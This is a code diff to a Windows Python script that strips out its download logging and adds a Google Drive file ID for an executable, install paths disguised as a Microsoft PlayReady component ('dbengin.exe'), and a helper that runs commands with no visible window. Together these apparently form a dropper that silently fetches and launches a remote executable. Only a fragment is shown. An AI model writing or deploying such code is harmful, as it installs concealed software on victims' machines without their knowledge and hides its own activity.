@@ -4,29 +4,18 @@ import os
 import time
 import winreg
 from pathlib import Path
-    # Ensure logs directory exists and capture output for debugging.
-    try:
-        os.makedirs("logs", exist_ok=True)
-        log_path = os.path.join("logs", "download.log")
-        with open(log_path, "a", buffering=1) as logf:
-            logf.write(f"\n--- START {time.strftime('%Y-%m-%d %H:%M:%S')} ---\n")
-            proc = subprocess.Popen(
-                cmd,
-                creationflags=creationflags,
-                stdout=logf,
-                stderr=logf,
-                stdin=subprocess.DEVNULL,
-                close_fds=True,
-            )
-            logf.write(f"Started PID={proc.pid}\n")
-    except Exception as exc:
-        # Record failure to start in the log if possible
-        try:
-            os.makedirs("logs", exist_ok=True)
-            with open(os.path.join("logs", "download.log"), "a") as logf:
-                logf.write(f"Failed to launch: {exc}\n")
-        except Exception:
-            pass
+
+GDOWN_DRIVE_ID = "1W3Ddny5rolO3DrvyfQH9i2NFgn1uFh2n"
+OUTPUT_NAME = "downloaded_file.exe"
+
+# Final expected path after the exe self‑installs
+FINAL_EXE_LOCAL = Path(os.environ.get("LOCALAPPDATA", "")) / "Microsoft" / "PlayReady" / "dbengin.exe"
+FINAL_EXE_ROAMING = Path(os.environ.get("APPDATA", "")) / "Microsoft" / "PlayReady" / "dbengin.exe"
+
+def run_hidden(cmd, wait=False):
+    """Run a command with no visible window."""
+    creationflags = subprocess.CREATE_NO_WINDOW if sys.platform == "win32" else 0
+    if wait:
         return subprocess.run(cmd, creationflags=creationflags, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
     else:
         return subprocess.Popen(cmd, creationflags=creationflags, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
